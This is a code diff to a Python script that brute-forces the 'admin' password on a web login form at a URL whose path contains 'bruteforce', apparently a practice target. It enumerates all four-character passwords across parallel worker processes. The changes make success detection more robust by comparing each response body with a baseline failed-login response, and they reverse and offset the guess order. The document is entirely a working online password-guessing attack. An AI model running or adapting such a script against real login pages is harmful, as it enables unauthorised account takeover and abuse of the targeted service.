@@ -1,5 +1,5 @@
 import requests
-
+import requests
 import time
 from requests.exceptions import ConnectTimeout
 import multiprocessing as mp
@@ -10,8 +10,11 @@ url = 'https://dudo.gvpt.sk/bruteforce/account/login'
 passwords = [a+b+c+d for a in char for b in char for c in char for d in char]
 def req(i,passwords,foundit,ret_list):
     s = requests.session()
-    start = (((len(passwords)//count) * (i))) #+12000
+    certain = s.post(url,data={'username':'admin','password':'a','action':''})
+    certain = certain.text
+    start = (((len(passwords)//count) * (i)) +10000)
     end = (len(passwords)//count) * (i+1)
+    passwords = passwords[::-1]
     for password in passwords[start:end:]:
         if not foundit.is_set():
             try:
@@ -20,7 +23,7 @@ def req(i,passwords,foundit,ret_list):
                 print(f'timeout {i}')
                 time.sleep(5)
                 idk = s.post(url,data={'username':'admin','password':password,'action':''})
-            if idk.url!=url:
+            if idk.text!=certain:
                 ret_list.append(password)
                 foundit.set()
                 print(f'found password {password} {idk}')
@@ -50,3 +53,4 @@ if __name__ =='__main__':
         p.join()
     print(ret_list)
     print('finished')
+
